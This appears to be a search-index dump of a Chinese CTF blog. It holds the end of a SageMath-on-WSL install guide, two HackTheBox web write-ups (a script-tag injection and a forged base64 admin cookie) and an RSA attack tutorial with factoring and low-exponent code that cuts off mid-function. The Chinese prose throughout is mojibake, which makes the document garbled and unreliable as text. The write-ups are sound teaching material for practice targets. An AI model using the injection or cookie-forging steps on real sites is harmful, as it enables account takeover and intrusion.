ï¼š 12. &quot;$HOME/miniforge3/etc/profile.d/conda.sh&quot;conda activate base ç„¶åä½¿ç”¨Ctrl + oå’ŒCtrl + xä¿å­˜å¹¶é€€å‡ºã€‚ æœ€åå†è¿è¡Œï¼š 1source ~/.bashrc å®‰è£…sageé€šè¿‡ 1conda create -n sage sage -c conda-forge å®‰è£…sageã€‚ç„¶åæ¯æ¬¡ä½¿ç”¨ 1conda activate sage æ¿€æ´»sageç¯å¢ƒå¹¶ç”¨ 1sage æ‰“å¼€sageã€‚ ä¸‹è½½vscodeçš„wslç‰ˆç”±äºå•çº¯ç”¨å‘½ä»¤è¡Œè¿è¡Œsageä»£ç ä¸å¤ªæ–¹ä¾¿ï¼Œå¹¶ä¸”åªç”¨sageçš„è¯æœ‰äº›pythonçš„å‘½ä»¤ï¼ˆæ¯”å¦‚è¯´è¿æ¥æœåŠ¡å™¨ç­‰ï¼‰å®¹æ˜“å‡ºé—®é¢˜ï¼Œå¯ä»¥å®‰è£…ä¸€ä¸ªvscodeçš„wslç‰ˆã€‚ é¦–å…ˆåœ¨Windowsé‡Œçš„vscodeä¸‹è½½wslçš„æ’ä»¶ ä¹‹ååœ¨å½“å‰wslçš„å‘½ä»¤è¡Œé‡Œè¾“å…¥ï¼š 12code .# ç”¨vscodeæ‰“å¼€å½“å‰æ–‡ä»¶å¤¹ å®ƒä¾¿ä¼šå¼€å§‹è‡ªåŠ¨ä¸‹è½½wslç‰ˆçš„vscodeã€‚ ä¸‹è½½å®Œæˆåï¼Œæ¯æ¬¡å¯åŠ¨wslä¹‹ååªéœ€è¦å…ˆæ‰“å¼€vscodeï¼š 1code . ç„¶ååœ¨vscodeçš„å‘½ä»¤è¡Œé‡Œè¾“å…¥ï¼š 1conda activate sage ä¾¿å¯ä»¥ç¼–å†™å¹¶è¿è¡Œimportäº†sageåº“çš„pythonä»£ç ã€‚ è®°ä½è¦å…ˆå¼€vscodeå†å¼€å¯sageçš„ç¯å¢ƒï¼Œä¸ç„¶å…ˆå¼€å¯äº†sageç¯å¢ƒåï¼Œè¿›åˆ°vscodeé‡Œä¼šæ‰å›baseçš„ç¯å¢ƒï¼ ä¸‹è½½sageæºç å¹¶ç¼–è¯‘è¿™ç§æ–¹æ³•å®‰è£…çš„æ˜¯æœ€æ–°ç‰ˆçš„sageï¼ŒåŠŸèƒ½ä¼šç›¸å¯¹å¤šå¾ˆå¤šï¼ˆå°¤å…¶æ˜¯æŸäº›Latticeç›¸å…³çš„åŠŸèƒ½ï¼‰ï¼Œåªä¸è¿‡æ•´ä½“æµç¨‹ä¼šå¾ˆé•¿ï¼Œå¯èƒ½ä¼šæŒç»­ä¸€ä¸ªå°æ—¶ã€‚ï¼ˆä¸»è¦æ˜¯ç¼–è¯‘é‚£æ­¥éœ€è¦ç­‰å¾ˆä¹…ã€‚ï¼‰ ç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œåœ¨sageçš„å®˜ç½‘ï¼šhttps://www.sagemath.org/download-linux.html å¯ä»¥çœ‹åˆ°ï¼š Sageå®˜æ–¹ä¸å†æä¾›ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰éœ€è¦è‡ªå·±åœ¨æœ¬åœ°ç¼–è¯‘ã€‚ å‡†å¤‡ç³»ç»Ÿç¯å¢ƒä½¿ç”¨ 1sudo nano /etc/apt/sources.list æ‰“å¼€sources.listæ–‡ä»¶å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼ˆæˆ–æ›¿æ¢ï¼‰ï¼š 1deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware ä¿å­˜å¹¶é€€å‡ºï¼ˆCtrl+Oï¼Œå›è½¦ï¼ŒCtrl+Xï¼‰ï¼Œç„¶åæ‰§è¡Œæ›´æ–°ï¼š 1sudo apt update &amp;&amp; sudo apt upgrade å®‰è£…æ„å»ºä¾èµ–Sage ä¾èµ–å¤§é‡å¼€å‘å·¥å…·ï¼Œå…ˆè£…äº›æœ€åŸºæœ¬çš„ï¼š 1sudo apt install build-essential m4 perl git curl python3 gfortran libbz2-dev libssl-dev libffi-dev libsqlite3-dev libreadline-dev automake cmake ä¹Ÿå¯èƒ½ä¼šç”¨åˆ°ï¼š 123sudo apt install pkg-config texinfo libmpfr-dev libgmp-dev libmpc-dev \\zlib1g-dev libncurses-dev libgdbm-dev libpng-dev libcurl4-openssl-dev \\libglpk-dev texlive texlive-latex-extra å»ºè®®å­˜å‚¨å¤Ÿçš„è¯å…¨éƒ½ä¸‹äº†ã€‚ ä¸‹è½½ Sage æºç 12git clone https://github.com/sagemath/sage.gitcd sage é…ç½®é¡¹ç›®1./configure æ£€æµ‹ä½ çš„ç³»ç»Ÿå·¥å…·å’Œåº“ï¼Œå¹¶å‡†å¤‡ Makefileã€‚å¦‚æœç¼ºå°‘ä¾èµ–ï¼Œå®ƒä¼šå‘Šè¯‰ä½ ç¼ºäº†ä»€ä¹ˆã€‚ ç¼–è¯‘ Sage1make -j$(nproc) æœ‰äº›æ—¶å€™ç¼–è¯‘æ—¶ä¼šæŠ¥cmake ç¼–è¯‘å¤±è´¥çš„é”™è¯¯ï¼Œè¿™æ—¶å¯ä»¥å…ˆè·³è¿‡ç¼–è¯‘ cmake çš„æ­¥éª¤ï¼Œç›´æ¥ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ç‰ˆæœ¬æ¥ä»£æ›¿ Sage è‡ªå·±ç¼–è¯‘çš„ç‰ˆæœ¬ï¼š è®¾ç½® Sage ä½¿ç”¨ç³»ç»Ÿçš„ cmakeï¼š 1export SAGE_INSTALL_USE_SYSTEM_CMAKE=yes ç„¶åé‡æ–°å¼€å§‹ç¼–è¯‘ï¼š 1make -j$(nproc) å¯åŠ¨ Sage1./sage å‡ºç°ç±»ä¼¼å¦‚ä¸‹è¾“å‡ºåˆ™è¡¨ç¤ºæˆåŠŸï¼š 1SageMath version 10.7.beta7, Release Date: 2025-06-29 åŠ å…¥å…¨å±€ç¯å¢ƒå˜é‡ï¼ˆå¯é€‰ï¼‰ä½ å¯ä»¥æŠŠ ./sage æ·»åŠ åˆ° PATHï¼Œæ–¹ä¾¿å…¨å±€ä½¿ç”¨ã€‚ é¦–å…ˆç¼–è¾‘ .bashrcï¼š 1nano ~/.bashrc åœ¨è¿™ä»½æ–‡ä»¶çš„æœ€ä¸‹æ–¹æ·»åŠ ï¼š 1export PATH=&quot;$HOME/ctf-kali/sage:$PATH&quot; ç„¶ååˆ·æ–°é…ç½®ï¼š 1source ~/.bashrc éªŒè¯ï¼š 1which sage åº”è¯¥è¾“å‡ºç±»ä¼¼ï¼š 1/home/archer/sage/sage","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/tags/wsl/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/tags/sage/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/tags/vscode/"},{"name":"kali","slug":"kali","permalink":"https://archer-baiyi.github.io/tags/kali/"},{"name":"Miniforge","slug":"Miniforge","permalink":"https://archer-baiyi.github.io/tags/Miniforge/"}]},{"title":"HTB Full Stack Conf Writeup","slug":"CTF/Web/HTB-Full-Stack-Conf-Writeup","date":"2025-03-30T10:40:40.000Z","updated":"2025-04-02T21:31:39.305Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-Full-Stack-Conf-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/30/CTF/Web/HTB-Full-Stack-Conf-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæ— é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š æ¸—é€å› ä¸ºæç¤ºç”¨alertï¼Œå¹¶ä¸”é¢˜ç›®æè¿°é‡Œæåˆ°äº†JavaScriptï¼Œæ‰€ä»¥ç›´æ¥å°è¯•æœ€ç®€å•çš„JavaScriptæ³¨å…¥ï¼š 1&lt;script&gt;alert(&#x27;1&#x27;);&lt;/script&gt; å¾—åˆ°flagï¼šHTB{p0p..p0p..p0p...alert(1337)} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"}]},{"title":"HTB baby auth Writeup","slug":"CTF/Web/HTB-baby-auth-Writeup","date":"2025-03-30T10:24:26.000Z","updated":"2025-04-02T21:31:50.592Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-baby-auth-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/30/CTF/Web/HTB-baby-auth-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæ— é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘ç«™ï¼š æ³¨å†Œä¸ªè´¦å·ç„¶åç™»å½•è¯•è¯•ï¼š æŸ¥çœ‹å½“å‰cookieï¼š è¿™æ®µå†…å®¹base64è§£ç å¯ä»¥å¾—åˆ°ï¼š 123eyJ1c2VybmFtZSI6IjEyMyJ9&#123;&quot;username&quot;:&quot;123&quot;&#125; æ¸—é€å°†cookieæ”¹æˆ 1&#123;&quot;username&quot;:&quot;admin&quot;&#125; çš„base64ï¼Œå³ 1eyJ1c2VybmFtZSI6ImFkbWluIn0= ä¿®æ”¹cookieç„¶ååˆ·æ–°ç½‘é¡µï¼š å¾—åˆ°flagï¼šHTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/tags/Cookie/"}]},{"title":"RSAåŠ è§£å¯†ä»¥åŠæ”»å‡»æ–¹æ³•","slug":"CTF/Crypto/RSAåŠ è§£å¯†ä»¥åŠæ”»å‡»æ–¹æ³•","date":"2025-03-29T19:01:56.000Z","updated":"2025-08-19T08:32:29.576Z","comments":true,"path":"2025/03/29/CTF/Crypto/RSAåŠ è§£å¯†ä»¥åŠæ”»å‡»æ–¹æ³•/","permalink":"https://archer-baiyi.github.io/2025/03/29/CTF/Crypto/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","excerpt":"","text":"RSAåŠ /è§£å¯†é¦–å…ˆè®¾ \\varphi(m) := | \\{ 1 \\leq k \\leq m ï½œ\\gcd(k, m) = 1 \\} |ä¸ºæ¬§æ‹‰å‡½æ•°ï¼ˆEulerâ€™sche Phi-functionï¼‰ã€‚ RSAåŠ å¯†ç®—æ³•çš„åˆå§‹åŒ–æµç¨‹å¦‚ä¸‹ï¼š é€‰æ‹©2ä¸ªå¾ˆå¤§çš„è´¨æ•°$p, q$. è®¡ç®—$n:=pq$ã€‚è¿™é‡Œçš„næ˜¯å…¬å¼€çš„ï¼Œ$p, q$åˆ™æ˜¯ä¿å¯†çš„ã€‚ è®¡ç®—$\\varphi(n)$ã€‚ï¼ˆå› ä¸ºæˆ‘ä»¬çŸ¥é“$n=pq$ï¼Œä¸”$p, q$å‡ä¸ºè´¨æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¬å¼$\\varphi(n)=(p-1)(q-1)$è¿›è¡Œå¿«é€Ÿè®¡ç®—ã€‚ï¼‰ é€‰æ‹©$e \\in \\{1,2,â€¦,\\varphi(n)-1\\}$ï¼Œä½¿å¾—$gcd(\\varphi(n),e)=1$. æˆ‘ä»¬çš„å…¬é’¥ä¸º$(e,n)$ã€‚ è®¡ç®—å¯†é’¥$d$ï¼Œæ»¡è¶³$ed \\equiv 1$ mod $\\varphi(n)$. ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ‰¾åˆ° $x$ å’Œ $y$ï¼Œä½¿å¾—ï¼š e \\cdot x + \\varphi(n) \\cdot y = 1, ä¸Šå¼ä¸­ï¼Œ$x$ æ¨¡ $\\varphi(n)$ çš„å€¼å³ä¸º $d$ï¼š d \\equiv x \\bmod \\varphi(n).å¦‚æœ $d &lt; 0$ï¼Œéœ€è¦å°†å…¶è°ƒæ•´åˆ°æ­£æ•°èŒƒå›´ï¼š d = d + \\varphi(n). å…¬é’¥ï¼š$n, e$ ç§é’¥ï¼š$d$ å‡è®¾æ˜æ–‡å†…å®¹ä¸º$m$ï¼Œå¯†æ–‡ä¸º$c$ï¼ŒåŠ å¯†ï¼š c=m^e \\text{ mod } n, \\ \\ \\ \\ a,b \\in \\mathbb{Z}_n.è§£å¯†ï¼š m=c^d \\text{ mod } n.å¦‚æ­¤ä¸€æ¥ï¼Œä»»ä½•äººéƒ½å¯ä»¥å°†ä¸€æ®µä¿¡æ¯åŠ å¯†åå‘é€ç»™æˆ‘ä»¬ï¼Œè€Œåªæœ‰æˆ‘ä»¬èƒ½å¤Ÿè§£å¯†è¿™æ®µä¿¡æ¯ã€‚ æ³¨æ„ï¼šåœ¨RSAåŠ è§£å¯†ä¸­æˆ‘ä»¬é»˜è®¤æ˜æ–‡$m$æ˜¯ä¸€ä¸ªå°äº$n$çš„æ•°ã€‚ è€Œæˆ‘ä»¬è¿™æ ·è®¡ç®—å‡ºæ¥çš„å¯†é’¥dä¹‹æ‰€ä»¥å¯ä»¥æˆåŠŸè§£å¯†ä¿¡æ¯æ˜¯åŸºäºä»¥ä¸‹ç†è®ºï¼š æ¬§æ‹‰å®šç†ï¼ˆEuler Theoremï¼‰ï¼šè®¾ $n$ æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œ$a$ æ˜¯ä¸€ä¸ªä¸ $n$ äº’ç´ çš„æ•´æ•°ï¼ˆå³ $(a, n) = 1$ï¼‰ï¼Œ$\\varphi$ æ˜¯æ¬§æ‹‰å‡½æ•°ã€‚é‚£ä¹ˆ a^{\\varphi(n)} \\equiv 1 \\ \\ \\ \\text{mod} \\ n.å®Œæ•´åŠ è§£å¯†ä»£ç ç¤ºä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes # å°†stringè½¬æ¢æˆå¤§æ•´æ•°from math import gcddef modinv(e, phi): # æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®—æ¨¡é€† def extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y) x, _ = extended_gcd(e, phi) return x % phip = getPrime(512) # 512ä½çš„ç´ æ•°q = getPrime(512) # 512ä½çš„ç´ æ•°n = p * qphi = (p - 1) * (q - 1)e = 65537 # å¤§éƒ¨åˆ†é»˜è®¤ä½¿ç”¨è¿™ä¸ªeçš„å€¼assert gcd(e, phi) == 1d = modinv(e, phi)# åŠ å¯†def encrypt(message, e, n): m = bytes_to_long(message.encode()) c = pow(m, e, n) return c# è§£å¯†def decrypt(cipher_int, d, n): m = pow(cipher_int, d, n) message = long_to_bytes(m).decode() return messagemsg = &quot;Hello World!&quot;cipher = encrypt(msg, e, n)decrypted = decrypt(cipher, d, n) RSA-CRTPEM æ ¼å¼ï¼ˆPrivacy Enhanced Mailï¼‰RSA çš„å¯†é’¥ï¼ˆæ— è®ºæ˜¯ç§é’¥è¿˜æ˜¯å…¬é’¥ï¼‰åœ¨ä¿å­˜æˆ–ä¼ è¾“æ—¶ï¼Œé€šå¸¸ä¼šè¢«å…ˆåºåˆ—åŒ–æˆäºŒè¿›åˆ¶æ ¼å¼ï¼ˆå¦‚ DERï¼‰ï¼Œç„¶åå†ç”¨ Base64 ç¼–ç ï¼Œå†åŠ ä¸Šå¤´å°¾æ ‡è®°ï¼ˆå¦‚ â€”â€”-BEGIN PUBLIC KEYâ€”â€”-ï¼‰ï¼Œå½¢æˆä¸€ç§å« PEM çš„æ–‡æœ¬æ ¼å¼ã€‚ æˆ‘ä»¬æœ‰2ç§æ¯”è¾ƒå¥½ç”¨çš„æ–¹æ³•æ¥ç”Ÿæˆ/è§£æPEMå†…å®¹ï¼š Pythonä½¿ç”¨ cryptography åº“ï¼š ç”Ÿæˆç”Ÿæˆç§é’¥ï¼š 123456789101112131415161718192021222324252627282930313233343536373839from cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives import serializationfrom Crypto.Util.number import getPrimee = 65537p = getPrime(512) # 512ä½çš„ç´ æ•°q = getPrime(512) # 512ä½çš„ç´ æ•°n = p * qphi = (p - 1) * (q - 1)d = pow(e, -1, phi)# è®¡ç®— CRT å‚æ•°# è¿™äº›å‚æ•°å¿…é¡»ä¼ ï¼ˆåº“è¦æ±‚çš„ï¼‰dmp1 = d % (p - 1)dmq1 = d % (q - 1)iqmp = pow(q, -1, p)# æ„é€ ç§é’¥å¯¹è±¡private_numbers = rsa.RSAPrivateNumbers( p=p, q=q, d=d, dmp1=dmp1, dmq1=dmq1, iqmp=iqmp, public_numbers=rsa.RSAPublicNumbers(e=e, n=n))private_key = private_numbers.private_key()# å¯¼å‡ºä¸º PEM æ ¼å¼ï¼ˆPKCS#8ï¼‰pem = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption())# æ‰“å° PEM ç§é’¥print(pem.decode()) ç„¶åå¯ä»¥ä»é‡Œé¢æå–å…¬é’¥ï¼š 123456public_key = private_key.public_key()pem_pub = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)print(pem_pub.decode()) è§£æè§£æç§é’¥ï¼š 123456789101112131415161718192021222324from cryptography.hazmat.primitives import serializationpem_data = b&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----......-----END PRIVATE KEY-----&quot;&quot;&quot;# è§£æ PEM ç§é’¥å¯¹è±¡private_key = serialization.load_pem_private_key( pem_data, password=None # å¦‚æœåŠ å¯†äº†ï¼Œéœ€è¦æä¾›å¯†ç ï¼ˆbytesï¼‰)# æå–ç§é’¥å‚æ•°ï¼ˆé€‚ç”¨äº RSA å¯†é’¥ï¼‰numbers = private_key.private_numbers()# æ‰“å°å‡º RSA ç§é’¥å‚æ•°print(f&quot;Modulus (n): &#123;numbers.public_numbers.n&#125;&quot;)print(f&quot;Public Exponent (e): &#123;numbers.public_numbers.e&#125;&quot;)print(f&quot;Private Exponent (d): &#123;numbers.d&#125;&quot;)print(f&quot;Prime 1 (p): &#123;numbers.p&#125;&quot;)print(f&quot;Prime 2 (q): &#123;numbers.q&#125;&quot;)print(f&quot;d mod (p-1): &#123;numbers.dmp1&#125;&quot;)print(f&quot;d mod (q-1): &#123;numbers.dmq1&#125;&quot;)print(f&quot;q^-1 mod p: &#123;numbers.iqmp&#125;&quot;) # ç”¨äºCRTçš„ è§£æå…¬é’¥ï¼š 123456789101112from cryptography.hazmat.primitives import serializationpem_data = b&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----......-----END PUBLIC KEY-----&quot;&quot;&quot;key = serialization.load_pem_public_key(pem_data)# æå–å…¬é’¥çš„è¯¦ç»†ä¿¡æ¯numbers = key.public_numbers()print(f&quot;Modulus (n): &#123;numbers.n&#125;&quot;)print(f&quot;Exponent (e): &#123;numbers.e&#125;&quot;) æ”»å‡»è´¨å› æ•°åˆ†è§£nFermatâ€™s Factorizationè¿™ç§æ–¹æ³•é€‚ç”¨äºpå’Œqçš„å¤§å°å·®ä¸å¤šçš„æƒ…å†µã€‚ ç®—æ³•åŸç†ï¼šæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ªå¼•ç†ï¼šå¼•ç† 1 å¦‚æœ $n$æ˜¯ä¸€ä¸ªå¥‡æ­£æ•´æ•°ï¼Œé‚£ä¹ˆå°†$n$åˆ†è§£ä¸ºä¸¤ä¸ªæ­£æ•´æ•°çš„ä¹˜ç§¯ï¼Œä¸å°†å…¶è¡¨ç¤ºä¸ºä¸¤ä¸ªå¹³æ–¹æ•°ä¹‹å·®ä¹‹é—´å­˜åœ¨ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚ è¯æ˜ï¼š è®¾næ˜¯ä¸€ä¸ªå¥‡æ­£æ•´æ•°ï¼Œä¸”$ n = ab$ï¼Œå…¶ä¸­$a$å’Œ$b$æ˜¯ä¸¤ä¸ªæ­£çš„å¥‡æ•´æ•°ã€‚é‚£ä¹ˆ$n$å¯ä»¥è¡¨ç¤ºä¸ºä¸¤ä¸ªå¹³æ–¹æ•°ä¹‹å·®ï¼š n = ab = s^2 - r^2,å…¶ä¸­ï¼Œ$r = \\frac{a - b}{2}$ï¼Œ$s = \\frac{a + b}{2}$ã€‚åè¿‡æ¥ï¼Œå¦‚æœ$n$æ˜¯ä¸¤ä¸ªå¹³æ–¹æ•°ä¹‹å·®ï¼Œå³$n = s^2 - r^2$ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†å…¶å› å¼åˆ†è§£ä¸ºï¼š n = (s - r)(s + r).ä¹Ÿå°±ç®—è¯´ï¼šå¯¹äºä»»æ„çš„å¥‡æ­£æ•´æ•°$n$ï¼Œåªè¦æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°2ä¸ªæ•°$s,r$ï¼Œä½¿å¾—ä»–ä»¬çš„å¹³æ–¹å·®ç­‰äº$n$ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°$n$çš„ä¸¤ä¸ªå› æ•°ã€‚$\\square$ å› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä»¥ä¸‹ç®—æ³•ï¼š é¦–å…ˆè®¡ç®— $t := \\lceil \\sqrt{n} \\rceil$ ä¾æ¬¡æµ‹è¯• $t^2-n, (t+1)^2-n,â€¦ $ æ˜¯å¦ä¸ºå¹³æ–¹æ•° å¦‚æœæ˜¯ï¼ˆå³$r^2 = s^2-n$ ï¼‰ï¼Œåˆ™å¾—åˆ°$n = (s-r)(s+r)$ã€‚ å¦‚æœä¸æ˜¯ï¼Œåˆ™è¿™ä¸ªæ–¹æ³•è¡Œä¸é€šã€‚ æ³¨æ„ï¼Œè¿™ä¸ªç®—æ³•ä¸€å®šä¼šç»ˆæ­¢ï¼Œå› ä¸ºæµ‹è¯•åˆ°$s = n+1$æ—¶ï¼š n = (\\frac{n+1}{2})^2 - (\\frac{n-1}{2})^2ä¼šå¾—åˆ°$n = n\\cdot 1$ï¼ˆæ²¡æœ‰ä»€ä¹ˆæ„ä¹‰ï¼‰ï¼Œä½†æ˜¯åœ¨å®é™…æƒ…å†µé‡Œæˆ‘ä»¬ä¸ä¸€å®šä¼šè®©å®ƒè·‘å®Œï¼Œå› ä¸ºå¤ªæ…¢äº†ã€‚ ä»£ç å®ç°ï¼š 1234567891011121314151617181920import mathdef fermat_factor(n, max_iter=1000000): a = math.isqrt(n) if a * a &lt; n: a += 1 for _ in range(max_iter): b2 = a*a - n b = math.isqrt(b2) if b*b == b2: return a - b, a + b a += 1 return Nonen = result = fermat_factor(n)if result: print(&quot;p =&quot;, result[0], &quot;q =&quot;, result[1])else: print(&quot;æœªæˆåŠŸ&quot;) Pollardâ€™s p-1é€‚ç”¨äº$n$æœ‰ä¸€ä¸ªsmooth factor $p$ï¼ˆå³æ‰€æœ‰æ»¡è¶³$q | (p-1)$çš„ç´ æ•°$q$éƒ½å¾ˆå°ï¼‰çš„æƒ…å†µã€‚ ç®—æ³•åŸç†ï¼š é¦–å…ˆæ¥å›é¡¾ä»¥ä¸‹è´¹é©¬å°å®šç†ï¼š è´¹é©¬å°å®šç†ï¼ˆFermatâ€™s Little Theoremï¼‰ï¼šè®¾ $p$ æ˜¯ä¸€ä¸ªç´ æ•°ï¼Œ$a$ æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œä¸” $a$ ä¸ $p$ äº’ç´ ï¼ˆå³ $(a, p) = 1$ï¼‰ã€‚é‚£ä¹ˆæœ‰ï¼š a^{p - 1} \\equiv 1 \\pmod{p} æˆ‘ä»¬ç°åœ¨å‡è®¾$p$æ˜¯$n$çš„ä¸€ä¸ªç´ å› æ•°ã€‚å¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸€ä¸ªæ•´æ•°$k$ä½¿å¾—$(p-1)|k!$ï¼Œå³å­˜åœ¨ä¸€ä¸ª$l$ä½¿å¾—$(p-1)l=k!$ï¼Œé‚£ä¹ˆå°±æœ‰ï¼š 2^{k!} = 2^{(p-1)l} = (2^{p-1})^l \\equiv 1^l \\equiv 1 \\ \\ \\ \\text{ mod }pè¿™æ„å‘³ç€ $p|(2^{k!}-1)$ï¼Œä¹Ÿå°±æ˜¯è¯´$p$æ˜¯$2^{k!}-1$å’Œ$n$çš„ä¸€ä¸ªå…±åŒçš„å› æ•°ã€‚ æ‰€ä»¥ç®—æ³•å¦‚ä¸‹ï¼š å¯¹äº$k=1,2,3,â€¦$æˆ‘ä»¬è®¡ç®— r_k := (2^{k!} \\ \\ \\text{ mod }n) è®¡ç®—$M = \\text{gcd}(r^k-1,n)$ï¼š å¦‚æœç­‰äº1ï¼Œåˆ™ç»§ç»­ï¼› å¦‚æœä¸ç­‰äº1ï¼Œé‚£ä¹ˆ$p$ä¸€å®šæ˜¯$M$çš„ä¸€ä¸ªå› æ•°ã€‚è¿™æ—¶åªéœ€è¦å¯¹$M$è¿›è¡Œè´¨å› æ•°åˆ†è§£ã€‚ ä»£ç å®ç°ï¼š 1234567891011121314151617import mathdef pollard_p1(n, B=1000000): a = 2 for j in range(2, B): a = pow(a, j, n) g = math.gcd(a-1, n) if 1 &lt; g &lt; n: return g, n // g return Nonen = result = pollard_p1(n)if result: print(&quot;p =&quot;, result[0], &quot;q =&quot;, result[1])else: print(&quot;æœªæˆåŠŸ&quot;) The Elliptic Curve Factorization Methodè¯¦ç»†å¯è§ï¼š https://doc.sagemath.org/html/en/reference/interfaces/sage/interfaces/ecm.html æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨sageçš„ecm.factor()å‡½æ•°ã€‚ ä¾‹å­ï¼š 1234from sage.all import *n = factors = ecm.factor(n)phi = prod([f - 1 for f in factors]) ä½æŒ‡æ•°æ”»å‡»ä½åŠ å¯†æŒ‡æ•°æ”»å‡»é€‚ç”¨äºåŠ å¯†æ‰€é€‰çš„eéå¸¸å°çš„æƒ…å†µï¼Œæ¯”å¦‚è¯´ e=3,5 ä¹‹ç±»çš„ã€‚ è¿™ä¸ªæ—¶å€™å¾ˆæœ‰å¯èƒ½ $m^e &lt; 10^5 \\cdot n$ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥éå†ã€‚ ä»£ç ç¤ºä¾‹ï¼š 123456789101112131415161718from gmpy2 import irootfrom Crypto.Util.number import long_to_bytese = n = c = # å¯ä»¥æ ¹æ®æ¡ä»¶ä»¥åŠæµ‹è¯•ç»“æœè°ƒæ•´maxçš„å¤§å°max = 10000for i in range(1, max): modified_c = c + i * n m_root, exact = iroot(modified_c, e) if exact: print(f&quot;æ‰¾åˆ°è§£: i = &#123;i&#125;&quot;) print(&quot;æ˜æ–‡:&quot;, long_to_bytes(m_root)) breakelse: print(&quot;å°è¯•èŒƒå›´å†…æœªæ‰¾åˆ°å¯è§£çš„ m&quot;) ä½è§£å¯†æŒ‡æ•°æ”»å‡»è¿™ç§æ”»å‡»é€‚ç”¨äºdç‰¹åˆ«å°çš„æƒ…å†µã€‚ï¼ˆå½“ç»™çš„eéå¸¸å¤§çš„æ—¶å€™éƒ½å¯ä»¥è¯•ä¸€ä¸‹è¿™ç§æ–¹æ³•ã€‚ï¼‰ Wienerâ€™s Attackè¿™ä¸ªæ˜¯åŸºäºè¿åˆ†æ•°ï¼ˆContinued Fractionï¼‰çš„ä¸€ç§ç®—æ³•ã€‚é€‚ç”¨äº $d &lt; \\frac{n^{1/4}}{3}$ çš„æƒ…å†µã€‚ ä»£ç ç¤ºä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import mathfrom Crypto.Util.number import long_to_bytesdef continued_fraction(numerator, denominator): &quot;&quot;&quot;ç”Ÿæˆåˆ†æ•° numerator/denominator çš„è¿åˆ†æ•°è¡¨ç¤º&quot;&quot;&quot; cf = [] while denominator: a = numerator // denominator cf.append(a) numerator, denominator = denominator, numerator - a * denominator return cfdef convergents_from_cf(cf): &quot;&quot;&quot;æ 